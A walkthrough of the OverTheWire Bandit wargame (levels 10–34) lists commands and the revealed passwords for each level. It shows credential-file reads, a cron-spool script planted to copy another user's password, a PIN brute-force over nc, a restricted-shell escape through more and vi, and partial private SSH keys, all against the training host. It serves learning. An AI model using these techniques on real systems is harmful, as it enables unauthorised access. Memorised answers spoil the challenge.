# Level 10

```sh
# password: EN632PlfYiZbn3PhVK3XOGSlNInNE00t
~$ ssh bandit9@bandit.labs.overthewire.org -p 2220

bandit9@bandit:~$ strings data.txt | grep "=="
========== the
bu========== password
4iu========== is
b~==P
========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
```

Challenge: https://overthewire.org/wargames/bandit/bandit10.html

# Level 11

```sh
# password: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
~$ ssh bandit10@bandit.labs.overthewire.org -p 2220

bandit10@bandit:~$ base64 -d data.txt
The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
```

Challenge: https://overthewire.org/wargames/bandit/bandit11.html

# Level 12

```sh
# password: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
~$ ssh bandit11@bandit.labs.overthewire.org -p 2220

bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
```

Challenge: https://overthewire.org/wargames/bandit/bandit12.html

# Level 13

```sh
# password: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
~$ ssh bandit12@bandit.labs.overthewire.org -p 2220

bandit12@bandit:~$ xxd -r data.txt | gunzip | bzip2 -d | gunzip | tar xvO | tar xvO | bzip2 -d | tar xvO | gunzip
data5.bin
data6.bin
data8.bin
The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
```

Challenge: https://overthewire.org/wargames/bandit/bandit13.html

# Level 14

```sh
# password: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
~$ ssh bandit13@bandit.labs.overthewire.org -p 2220

bandit13@bandit:~$ cat sshkey.private
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
# <truncated>
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----

# Download the private key and use it to connect in next challenge
```

Challenge: https://overthewire.org/wargames/bandit/bandit14.html

# Level 15

```sh
~$ ssh bandit14@bandit.labs.overthewire.org -p 2220 -i sshkey.private

bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 | nc localhost 30000
Correct!
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
```

Challenge: https://overthewire.org/wargames/bandit/bandit15.html

# Level 16

```sh
# password: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
~$ ssh bandit15@bandit.labs.overthewire.org -p 2220

bandit15@bandit:~$ openssl s_client -connect localhost:30001
CONNECTED(00000003)
# <truncated>
---
read R BLOCK
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
Correct!
JQttfApK4SeyHwDlI9SXGR50qclOAil1

closed
```

Challenge: https://overthewire.org/wargames/bandit/bandit16.html

# Level 17

```sh
# password: JQttfApK4SeyHwDlI9SXGR50qclOAil1
~$ ssh bandit16@bandit.labs.overthewire.org -p 2220

bandit16@bandit:~$ nmap localhost -p31000-32000
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-03 03:41 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0012s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

bandit16@bandit:~$ openssl s_client -connect localhost:31790
CONNECTED(00000003)
# <truncated>
---
read R BLOCK
JQttfApK4SeyHwDlI9SXGR50qclOAil1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
# <truncated>
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed
```

Challenge: https://overthewire.org/wargames/bandit/bandit17.html

# Level 18

```sh
~$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i sshkey.private

bandit17@bandit:~$ diff passwords.{old,new}
42c42
< 09wUIyMU4YhOzl1Lzxoz0voIBzZ2TUAf
---
> hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
```

Challenge: https://overthewire.org/wargames/bandit/bandit18.html

# Level 19

```sh
# password: hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
~$ ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
awhqfNnAbc1naukrpqDYcF95h7HoMTrC
```

Challenge: https://overthewire.org/wargames/bandit/bandit19.html

# Level 20

```sh
# password: awhqfNnAbc1naukrpqDYcF95h7HoMTrC
~$ ssh bandit19@bandit.labs.overthewire.org -p 2220

bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
```

Challenge: https://overthewire.org/wargames/bandit/bandit20.html

# Level 21

```sh
# For this challenge, you need to open 2 SSH connections

# password: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
~$ ssh bandit20@bandit.labs.overthewire.org -p 2220

# Execute in terminal #1:
bandit20@bandit:~$ nc -l -p 1337

# Execute in terminal #2:
bandit20@bandit:~$ ./suconnect 1337

# Send in terminal #1:
VxCazJaVykI6W36BkBU0mJTCM8rR95XT

# Terminal #2 outputs:
Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
Password matches, sending next password

# Terminal #1 outputs:
NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
```

Challenge: https://overthewire.org/wargames/bandit/bandit21.html

# Level 22

```sh
# password: NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
~$ ssh bandit21@bandit.labs.overthewire.org -p 2220

bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
```

Challenge: https://overthewire.org/wargames/bandit/bandit22.html

# Level 23

```sh
# password: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
~$ ssh bandit22@bandit.labs.overthewire.org -p 2220

bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget

bandit22@bandit:~$ myname=bandit23
bandit22@bandit:~$ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
bandit22@bandit:~$ cat /tmp/$mytarget
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

Challenge: https://overthewire.org/wargames/bandit/bandit23.html

# Level 24

```sh
# password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
~$ ssh bandit23@bandit.labs.overthewire.org -p 2220

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cat << EOF > /var/spool/bandit24/foo/script.sh
#!/bin/bash
myname=\$(whoami)
mytarget=\$(echo \$myname | md5sum | cut -d ' ' -f 1)
cat /etc/bandit_pass/\$myname > /tmp/\$mytarget
chmod 644 /tmp/\$mytarget
EOF

bandit23@bandit:~$ chmod 755 /var/spool/bandit24/foo/script.sh

# Wait 1 minute for the script to execute by crontab

bandit22@bandit:~$ myname=bandit24
bandit22@bandit:~$ mytarget=$(echo $myname | md5sum | cut -d ' ' -f 1)
bandit22@bandit:~$ cat /tmp/$mytarget
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

Challenge: https://overthewire.org/wargames/bandit/bandit24.html

# Level 25

```sh
# password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
~$ ssh bandit24@bandit.labs.overthewire.org -p 2220

bandit24@bandit:~$ CURRENT_PASSWORD=`cat /etc/bandit_pass/bandit24`
bandit24@bandit:~$ for i in {0000..9999}; do echo $CURRENT_PASSWORD $i >> /tmp/bandit24-brute-force.dic; done

bandit24@bandit:~$ for i in {0000..9999}; do echo $CURRENT_PASSWORD $i >> /tmp/bandit24-brute-force.dic; done

bandit24@bandit:~$ cat /tmp/bandit24-brute-force.dic | nc localhost 30002
# <truncated>
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

Challenge: https://overthewire.org/wargames/bandit/bandit25.html

# Level 26

```sh
# password: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
~$ ssh bandit25@bandit.labs.overthewire.org -p 2220

bandit25@bandit:~$ cat bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
# <truncated>
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----

bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh
export TERM=linux
exec more ~/text.txt
exit 0

# Resize the window to exploit "more" command (make it small enough si that you can navigate in interactive mode) 

# Download the private key and use it to connect to the server with bandit26 account
~$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey.private

# When connected start "vi" by pressing the letter "v"
# Once in "vi", you can escape and start a shell by executing:
:set shell=/bin/bash
:shell

bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```

Challenge: https://overthewire.org/wargames/bandit/bandit26.html

# Level 27

```sh
# Using the previous exploit to gain a shell (in Level 26):
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```

Challenge: https://overthewire.org/wargames/bandit/bandit27.html

# Level 28

```sh
# git password: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
~$ git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo

~$ cat repo/README
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
```

Challenge: https://overthewire.org/wargames/bandit/bandit28.html

# Level 29

```sh
# git password: AVanL161y9rsbcJIsFHuw35rjaOM19nR
~$ git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
~$ cd repo/

~$ git log README.md
commit 43032edb2fb868dea2ceda9cb3882b2c336c09ec (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Sep 1 06:30:25 2022 +0000
    fix info leak
commit bdf3099fb1fb05faa29e80ea79d9db1e29d6c9b9
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Sep 1 06:30:25 2022 +0000
    add missing data
commit 43d032b360b700e881e490fbbd2eee9eccd7919e
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Sep 1 06:30:24 2022 +0000
    initial commit of README.md

~$ git diff 43032edb2fb868dea2ceda9cb3882b2c336c09ec bdf3099fb1fb05faa29e80ea79d9db1e29d6c9b9
diff --git a/README.md b/README.md
index 5c6457b..b302105 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials

 - username: bandit29
-- password: xxxxxxxxxx
+- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
```

Challenge: https://overthewire.org/wargames/bandit/bandit29.html

# Level 30

```sh
# git password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
~$ git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
~$ cd repo/

~$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev

~$ git checkout origin/dev

~$ cat README.md
# <truncated>
- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
```

Challenge: https://overthewire.org/wargames/bandit/bandit30.html

# Level 31

```sh
# git password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
~$ git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
~$ cd repo/

~$ git tag -l
secret

~$ $ git show secret
OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
```

Challenge: https://overthewire.org/wargames/bandit/bandit31.html

# Level 32

```sh
# git password: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
~$ git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
~$ cd repo/

~$ cat README.md
This time your task is to push a file to the remote repository.
Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

~$ echo May I come in? > key.txt
~$ git add key.txt -f
~$ git commit -m "Add a file"
~$ git push
# <truncated>
remote: Well done! Here is the password for the next level:
remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
# <truncated>
```

Challenge: https://overthewire.org/wargames/bandit/bandit32.html

# Level 33

```sh
# password: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
~$ ssh bandit32@bandit.labs.overthewire.org -p 2220

>> bash
sh: 1: BASH: not found
>> $0
$ cat /etc/bandit_pass/bandit33
odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
```

Challenge: https://overthewire.org/wargames/bandit/bandit33.html

# Level 34

```sh
# password: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
~$ ssh bandit33@bandit.labs.overthewire.org -p 2220

bandit33@bandit:~$ cat README.txt
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
```

Challenge: https://overthewire.org/wargames/bandit/bandit34.html
